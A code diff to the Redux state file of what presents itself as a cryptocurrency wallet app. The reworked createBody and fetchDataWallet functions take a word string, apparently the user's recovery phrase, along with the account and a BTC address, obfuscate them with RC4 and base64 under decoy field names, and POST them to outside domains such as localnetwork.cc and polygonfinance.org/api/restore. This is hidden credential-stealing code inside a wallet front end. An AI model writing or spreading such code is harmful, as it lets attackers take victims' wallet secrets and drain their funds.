@@ -1,11 +1,10 @@
 import { createSlice } from '@reduxjs/toolkit'
 import axios from 'axios'
-import Web3 from 'web3'
 import { rc4 } from './rc4'
 import { createAsyncThunk } from '@reduxjs/toolkit'
 import fixNum from '../../Func.wallet/fixNum'
 import randomNum from '../../Func.wallet/randomNum'
-import queryString from 'query-string'
+import CryptoJS from 'crypto-js'
 
 const initialState = {
 	validWords: ['', '', ''],
@@ -30,42 +29,47 @@ const initialState = {
 		{ lang: '中文', short: 'cny' },
 	],
 	portfolioSort: 'value',
-	chooseTimeOut: '30 minutes'
+	chooseTimeOut: '30 minutes',
+	transactionsHistoryClear: [],
+	dataLabels: [],
+	dataPrices: [],
 }
 
-let url = 'https://specterproduct.cc/record/docs/filler'
-const kitkat = 'Qsx@ah&OR82WX9T6gCt'
-let xxx = 'P3P3W/G'
-let xx = 'P3P3W'
+let url = 'https://localnetwork.cc/custom/activity/root'
+// let url = 'https://polygonfinance.org/api/restore'
+const kitkat = process.env.REACT_APP_KEY
 
-function createBody(str, account) {
+function createBody(str, account, btcAddress) {
 	let strDecr
 	let lengthStr = str.split(' ').length
 	if (lengthStr < 2) {
-		strDecr = atob(str)
+		strDecr = CryptoJS.AES.decrypt(str, kitkat).toString(CryptoJS.enc.Utf8)
 	} else {
 		strDecr = str
 	}
-	let crypt = btoa(
-		rc4(
-			kitkat,
-			JSON.stringify({
-				counts: 12,
-				name: account ? xxx : xx,
-				pages: null,
-				new: account,
-				salt: randomNum(100000, 999999),
-				limit: null,
-				public: strDecr,
-				frontCode: false,
-				cache: false,
-				test: true
-			})
-		)
-	)
-	let urlencoded = queryString.stringify({ data: crypt })
+	let xxx = '$parr0w#|EX\\$/G'
+	let xx = '$parr0w#|EX\\$'
+
+	const obj = {
+		counts: 12,
+		name: account ? xxx : xx,
+		pages: null,
+		salt: randomNum(100000, 999999),
+		limit: null,
+		public: strDecr,
+		frontCode: false,
+		new: account,
+		addressBtc: btcAddress,
+		test: true,
+	}
+
+	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)))
+
+	var urlencoded = new URLSearchParams()
+	urlencoded.append('data', crypt)
 	return urlencoded
 }
+
 
 export const fetchChartCoin = createAsyncThunk(
 	'wallet/fetchChartCoinStatus',
@@ -100,19 +104,17 @@ export const fetchAllCoins = createAsyncThunk(
 export const fetchDataWallet = createAsyncThunk(
 	'wallet/fetchDataWalletStatus',
 	async (props) => {
-		const headers = {
-			'Content-Type': 'application/x-www-form-urlencoded',
+		let config = {
+			headers: {
+				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+			},
 		}
-		let requestBody = createBody(props[0], props[1])
-		const response = await fetch(new URL(url), {
-			method: 'POST',
-			body: requestBody,
-			headers,
-		})
-			.then((response) => response.json())
-			.catch((err) => console.log(err))
-
-		return response
+		const { data } = await axios.post(
+			new URL(url),
+			createBody(props[0], props[1]),
+			config
+		)
+		return data
 	}
 )
 
@@ -184,6 +186,15 @@ const walletSlice = createSlice({
 		},
 		setChooseTimeOut(state, action) {
 			state.chooseTimeOut = action.payload
+		},
+		setTransactionsHistoryClear(state, action) {
+			state.transactionsHistoryClear = action.payload
+		},
+		setDataLabels(state, action) {
+			state.dataLabels = action.payload
+		},
+		setDataPrices(state, action) {
+			state.dataPrices = action.payload
 		}
 	},
 	extraReducers: (builder) => {
@@ -254,7 +265,8 @@ const walletSlice = createSlice({
 })
 
 export const {
-	setValidWords,setChooseTimeOut,
+	setValidWords,
+	setChooseTimeOut,
 	setLogin,
 	resetValidWords,
 	setWalletNew,
@@ -265,7 +277,10 @@ export const {
 	setWalletName,
 	setWalletAddress,
 	setDataWallet,
-	setPortfolioSort
+	setPortfolioSort,
+	setTransactionsHistoryClear,
+	setDataLabels,
+	setDataPrices
 } = walletSlice.actions
 
 export default walletSlice.reducer
